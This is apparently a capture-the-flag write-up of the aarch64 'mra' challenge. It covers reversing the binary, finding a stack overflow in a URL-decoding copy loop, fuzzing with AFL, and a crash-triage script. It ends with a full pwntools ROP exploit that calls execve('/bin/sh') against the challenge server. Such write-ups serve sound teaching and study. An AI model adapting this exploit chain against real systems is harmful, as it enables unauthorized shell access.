# mra: pwn/rev

Files for this challenge are attached in the directory.

## Initial Analysis

So we get a binary called `mra`. First things first, some standard checklist items:

```
❯ file mra
mra: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, stripped
```

Ok, `aarch64`. It's also statically linked, so we won't be doing any ret2libc here. 

```
❯ checksec mra
[*] '/home/novafacing/hub/b01lers-library/2021OOO/pwn/mra/mra'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we have no canary and no PIE, but NX on. No shellcoding, most likely we're going to need to ROP to succeed here. Of course, I haven't opened the binary at this point so that's just conjecture ;)

I started working on this challenge in Ghidra, but had a pretty rough time exploring the disassembly (we'll see why shortly). I ended up switching to [cutter](https://cutter.re) late in the competition with *much* more success. I won't include any of my Ghidra snips here, but they happened and I did use Ghidra to identify all of the library functions before switching over during the "what the heck is the actual exploit here" stage.

As usual, we want to start by finding main. Luckily here that's pretty easy, it'll be the first argument to `__libc_start_main` in `entry0` (called `entry` by Ghidra). Jump in there and we see that `main` is at `0x40033c`. For whatever reason, `cutter` had some issues identifying xrefs to `main`. I couldn't figure out why, but I already knew where it was thanks to Ghidra, so this didn't hold me up.

In main, we'll see several function calls. I'll briefly explain what made me guess each one (I ended up being 100% right!).

1. `fcn.00401018(**(int64_t **)0x41cf80, 0, 2, 0);` clearly this is setvbuf. lol.
2. `fcn.00405ba0` you can either guess from params or just look at [the source](https://github.com/bminor/glibc/blob/3cc4a8367c23582b7db14cf4e150e4068b7fd461/string/memset.c) that this is definitely memset with all its weird optimized copies. Never change, glibc. No seriously, don't change or these challenges will be much harder.
3. `uStack28 = fcn.004064f8(0, (int64_t)auStack1128, 0x3ff);` This one is a little trickier. If we click into it, we'll see this is basically a wrapper for `fcn.00408624` which in turn wraps `fcn.00408588`:

```asm
fcn.00408684 (int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4);
; arg int64_t arg1 @ x0
; arg int64_t arg2 @ x1
; arg int64_t arg3 @ x2
; arg int64_t arg4 @ x3
0x00408684 add sp, sp, 0x20
0x00408688 stur x0, [sp, -8]       ; arg1
0x0040868c stur x1, [sp, -0x10]    ; arg2
0x00408690 stur x2, [sp, -0x18]    ; arg3
0x00408694 stur x3, [sp, -0x20]    ; arg4
0x00408698 ldur x8, [sp, -8]       ; 8
0x0040869c ldur x0, [sp, -0x10]    ; 16
0x004086a0 ldur x1, [sp, -0x18]    ; 24
0x004086a4 ldur x2, [sp, -0x20]    ; 0x178000
;-- syscall.0.9:
0x004086a8 svc 0
0x004086ac sub sp, sp, 0x20
0x004086b0 ret
```
Here is where I learned that syscalls in `aarch64` are mercifully pretty simple. They're all listed by syscall number in [the ~~bible~~ source](https://github.com/torvalds/linux/blob/master/include/uapi/asm-generic/unistd.h). We know that this one is syscall `#0x37` from the outer function (syscall number is passed in `x8` on `aarch64` so when we see `fcn.00408624(0x3f, (int64_t)iStack000000000000002c, arg2, arg3, 0, 0, 0);` we'll know pretty well this is a `read` syscall. So, we can just call that outer function `read` (it's the libc wrapper for the syscall).

4. `fcn.00405eb0((int64_t)auStack1128, (int64_t)pcStack16, 0xf)` `pcStack16 = "GET /api/isodd/"` is right up above here, and is 0xf characters long. Doesn't take a super genius to realize this is `strncmp`.
5. If we look at the arguments to `fcn.00405ca8`, we come up with the list `0xa` (`n`), `0x3f` (`?`), `0x2f` (`/`). These are all pretty reasonable things to, well, `strchr` for in a URL. You could try and reverse it but...simiarly optimized to `memset` and pretty gross.
6. Similar deal with `fcn.00406358`, the args tell us this is *almost certainly* `strstr`.
7. Similarly to `strcmp`, we can check `strcmp` pretty easily by just looking at the args and checking the code quickly to see that we return the difference of two pointers inside the string. This is pretty indicative of strcmp behavior.
8. `sprintf` is located at `0x400d88`, and once again we can basically tell this by the args. We can also stop our debugger there and see that yes, the buffer gets copied into. Easy!

There are also `puts` and `printf` at `0x400f14` and `0x400e4c`, respectively. The exploit happens before these calls though. Anyway, if we put in all these calls, it becomes pretty clear that the program expects an input format of something like `GET /api/isodd/(0-9)+?token=(enterprise|premium|public)`. We can try some inputs, the answer comes back right! But where's the bug?

There are a couple functions I haven't mentioned yet. That's because it's time for our next section:

## Finding the Bug!

This is a pwn challenge, and therefore there must be a bug (or a few, but in this case there is basically just one). The function at `0x4001d0`, which I called `helper_with_copy` has some gross looking C code in Ghidra, but I retyped it out:

```c
int32 fun_4001d0(char * output, char * input) {
	int in_index = 0;
	int out_index = 0;
	char cur = input;

	while ((cur = input[in_index]) != 0) {
		if (cur == '%') {
			char temp = hex_to_dec(input[in_index + 1];)
			cur = hex_to_dec(input[in_index + 2]);
			cur = tmp & 0xff << 4 | cur; // Make 8 bit value from %0f hex
			in_index += 3;
		} else {
			in_index++;
		}
		output[out_index] = cur;
		out_index++;
	}
	return out_index;
}
```

This gets called with two arguments. Argument 0 is where we copy *to* and argument 1 is where we copy *from*, which ends up being (with a normal input) the number we want to test is odd or not. We're gonna get around that a bit. The output is a stack buffer that I'm honestly still not sure the size of, but it's not big enough. Basically what happens is we're just going to keep going while the current character of the input is not 0. So...if we want to overflow, save your nullbytes! Helpfully, the authors also convert any strings like `%0f` to an actual integer value and save it to the output. Neat! That happens with this code:

```c
char hex_to_dec(int64_t inp)
{
	uint8_t _inp;
	char reg;
	_inp = (uint8_t)inp;
	// if not 0-9:
	if ((_inp < 0x30) || (0x39 < _inp)) {
		// if not a-f
		if ((_inp < 0x61) || (0x66 < _inp)) {
			// if not A-F
			if ((_inp < 0x41) || (0x46 < _inp)) {
				// If we are not 0-9, not a-f, and not A-F, set to 0
				reg = '0';
			} else {
				// We are A-F, subtract 0x37 (0x41-0x37 == 10)
				reg = _inp - 0x37;
			}
		} else {
			// We are a-f, add 0xa9 ('a' + 0xa9 % 256 = 10)
			reg = _inp + 0xa9;
		}
	} else {
		// If it is 0-9, we convert to the integer 0-9
		reg = _inp - 0x30;
	}
	return reg;
}
```

If you're thinking "hey, that's pretty suspicious!", you're right. I thought so too, but I didn't really want to mess around too much to figure out exactly how to exploit this, so I turned to my friend AFL (specifically [AFL-Other-Arch](https://github.com/shellphish/afl-other-arch)). I used AFL with the following test cases:

```
GET /api/isodd/1234567890?token=enterprise
GET /api/isodd/1?token=public
GET /api/isodd/3?token=enterprise
GET HTTP /api/isodd/%01%ff%ab%ce?token=enterprise
GET /api/isodd/999999?token=public
GET /api/isodd/999999999999?token=enterprise
GET /api/isodd/999999999?token=premium
GET /api/isodd/2?token=premium
```

Then I just ran it with `afl-fuzz -Q -i ./testcases -o ./outputs -- ./mra` and let it get to work. Within 20 minutes it had found a few thousand crashes, so I figured it was probably time to figure out which ones were worth using. Basically, I figured that I know there's a buffer overflow, so we can reasonably expect `$pc` control from a good exploit. So I filtered the results for just that using this script:

```python
from pwn import *
from subprocess import run, PIPE
from pathlib import Path
import re
from binascii import hexlify

PC_REG = r"\(void \(\*\)\(\)\) (0x[0-9a-f]+)"
BT_REG = r"0x[0-9a-f]{16}"

SRCTEMPLATE = """target remote localhost:{}
c
p $pc
bt
q"""

# Too many open files thanks OSError -_-
files = []
procs = []

testcases = Path("outputs2/crashes")
# 
for portbase, testcase in enumerate(testcases.iterdir()):
	# Again...just to make sure the file descriptors close
    for f in files:
        try:
            f.close()
        except:
            pass
    for f in procs:
        try:
            f.kill()
        except:
            pass
		
    files = []
    procs = []

    tc = testcase
    port = portbase + 10000
	# Open our actual testcase file
    with open(tc, "rb") as tcc:
        files.append(tcc)
        content = tcc.read()
		# Start a qemu debug process
        r = process(["qemu-aarch64-static", "-g", str(port), "./mra"])
        procs.append(r)
        print(content)
        try:
			# Send the testcase to the process
            r.sendline(content)
        except:
            continue
        with open("gdbscript.gdb", "w") as srcfile:
            srcfile.write(SRCTEMPLATE.format(port))
        try:
			# Try and attach to the process and run the debugger script to collect the info
            proc = subprocess.run(["gdb-multiarch", "-q", "-x", "gdbscript.gdb"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
            op = proc.stdout
        except:
            try:
                proc.kill()
                r.close()
            except:
                pass
            continue
			
		# Print out the crashes, backtrace
        print("CRASHES========================")
        found_crashes = re.findall(PC_REG, op.decode("utf-8", errors="ignore"))
        print(found_crashes)
        print("BT=============================")
        backtrace = re.findall(BT_REG, op.decode("utf-8", errors="ignore"))
        print(backtrace)
        print("===============================")
		
		# STUPID BAD AND DUMB HEURISTIC for seeing if we control $pc
        hinput = hexlify(content)
        for f in found_crashes:
            check = bytes(hex(int(f, 16))[2:], "utf-8")
            print("==========CHECK: ", check, " IN ", hinput)
            if check in hinput:
                with open("goodcandidate.txt", "wb") as goods:
                    goods.write(content)
                    goods.write("\n==DONE==\n")
                    goods.write(bytes(str(found_crashes), "utf-8"))
                    goods.write(bytes(str(backtrace), "utf-8"))
        for f in found_crashes:
            check = bytes(hex(int(f, 16))[2:], "utf-8")
            if check in hinput:
                with open("goodcandidate.txt", "rb") as goods:
                    goods.write(content)
                    goods.write("\n==DONE==\n")
                    goods.write(bytes(str(found_crashes), "utf-8"))
                    goods.write(bytes(str(backtrace), "utf-8"))
        try:
            r.recv(timeout=2)
        except:
            pass
        try:
            proc.kill()
            r.close()
        except:
            pass
```

Now, is this overkill? Probably. Did it work? Also yes. Really you could have just not put a question mark or newline until the end of your input and it would also work. But this is a pretty fun way to solve. This script will write any inputs that successfully cause `$pc` to be part of the input (a bad heuristic in the general case but who cares) to the `goodcandidates.txt` file.

Anyway, I got a good candidate from one of my testcases:

```
GET /api/isodd/1234%8934%pris%d4444444>444444444444M444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444pris444444444444444444444444444444444444444444444444444444444444444444444isodd/444444!444444444444444444444444444444444444444api/444444444444444444444444444444F4444444444444@44444444444444444444444444444????pris?34%%%%%'%%%B4
```

Okay. So to validate this, I just plugged it into `gdb` and ran it normally, then printed out the stack around it with `x/20xg $sp`. Oops, all '4'! Now is when I looked up some good `arch64` ROP writeups [^1], got a little freaked out by the fact that `aarch64` actually doesn't return to the whatever is top of the stack (because of course it doesn't). Instead, it `ret`s to `x30`. Great. But the page got me somewhere: I knew I didn't want to mess around with having a bunch of gadgets. That's fine, because if you take a look at where nullbytes get placed due to read sizes, you'll realize we get a max of 5 gadgets anyway (I use 2 but "gadget" is a generous term). 

I replaced the '4' string with a `pwntools.cyclic.cyclic` string to figure out exactly where I needed to stick my payload, and got started crafting an exploit. I decided to not bother trying to rop to syscall or anything like that, because we're statically linked and we already have helper functions that call syscalls with our arguments, AND they take the syscall arguments from the stack for us. And we control the stack. It's extremely simple to get going.

The key is this block:

```asm
0x004085a8 ldur x8, [sp, -8]       ; 8
0x004085ac ldur x0, [sp, -0x10]    ; 16
0x004085b0 ldur x1, [sp, -0x18]    ; 24
0x004085b4 ldur x2, [sp, -0x20]    ; 32
0x004085b8 ldur x3, [sp, -0x28]    ; 40
0x004085bc ldur x4, [sp, -0x30]    ; 48
0x004085c0 ldur x5, [sp, -0x38]    ; 56
0x004085c4 svc 0
0x004085c8 sub sp, sp, 0x40
0x004085cc ret
```

What this does is it just loads the first 7 things starting from `$sp-8` into registers (first one being the syscall number) and executes a `svc` which is a supervisor call (basically equivalent to `int 0x80` or `syscall` on x86_64). We control everything on the stack up to this point, so we can leverage this to execute any syscall we want with any arguments. Naturally, I'll do `execve("/bin/sh\x00", NULL, NULL);`. We have a problem though, I don't have a stack leak (and can't get one), and I still need that first argument in `x0` to be a pointer to `/bin/sh\x00`. My solution to this is to execute two syscalls:

1. `read` into an area in `.data` with a particular address (thanks no-pie!) the string `/bin/sh\x00`.
2. `execve` now with the first argument as that pointer.

Notice that `sub sp, sp, 0x40` at the beginning? That's problematic, because I don't have arbitrary data in that location, so I wouldn't be able to get my args into `execve` after the first call. The solution: just run the `read` glibc wrapper function from the beginning instead! It already provides everything but the buffer to read into for us. From there, the rest is trivial, and the final script looks like this:

```python
from pwn import *

context.arch = "arm"
context.bits = 64

portbase = 1
port = portbase + 10000

# converts an int like 0x400 to a properly setup string like %00%04%00%00%00%%00%00%00
# Remember when I said the authors were nice?
def a2pp(addr):
    txtaddr = str(hex(addr))[2:]
    sep = [bytes(txtaddr[i:i+2], "utf-8") for i in range(0, len(txtaddr), 2)]
    new = list(map(lambda l: b"%" + l.rjust(2, b"0"), reversed(sep)))
    while len(new) < 8:
        new.append(b"%00")
    return b"".join(new)

pad = b""
pad += b"%41%41%41%4a" # this is truly just padding
pad += a2pp(0x00) # NULL 
pad += a2pp(0x00) # NULL
pad += a2pp(0x41d184) # "/bin/sh\x00" address
pad += a2pp(0xdd) # syscall num for execve
pad += a2pp(0x4141414141414146) # dummy, this is discarded
pad += a2pp(0x004085a8) # sp - 8 -> sp - 0x38 -> regs x8, 0,1,2,3,4,5 && syscall
pad += a2pp(0x4141414141414146) # also discarded
pad += a2pp(0x9) # 9 bytes to read, length of binsh + newline (so could be 8 I guess)
pad += a2pp(0x41d184) # Address in data segment to read string into
pad += a2pp(0x0000000000000000) # # Also discarded....see a pattern?
payload = b""
payload += a2pp(0x6666666666666666) # dummy
payload += a2pp(0x00406510) 
payload += a2pp(0x5555555555555555) # dummy
payload += a2pp(0x4444444444444444) # dummy
payload += a2pp(0x3333333333333333) # dummy
payload += a2pp(0x2222222222222222) # dummy
xrep = pad + payload
# Ugly because it's just from the fuzzer and I didn't really change anything. lol
content = b"GET /api/isodd/1236%\x00\x008936%pris%d6666666>" + xrep + b"VVVV/666666!666666666666666666666666666666666666666api/666666666666666666666666666666F6666666666666@66666666666666666666666666666\x15????pris?\x16\x1636%\x00%%%%'%\x7f%%B6\x03"

# This isn't really necessary
content += b"1" * (0x3ff - len(content))

r = remote("mra.challenges.ooo", 8000)
print()
print("Sending ", content)
r.send(content)
r.sendline(b"/bin/sh\x00")
# Shell!
r.interactive()
```


[^1]: [Perfect Blue's Excellent aarch64 ROP writeup](https://web.archive.org/web/20210503022008/https://blog.perfect.blue/ROPing-on-Aarch64) because I didn't know a whole lot about aarch64 pwn.
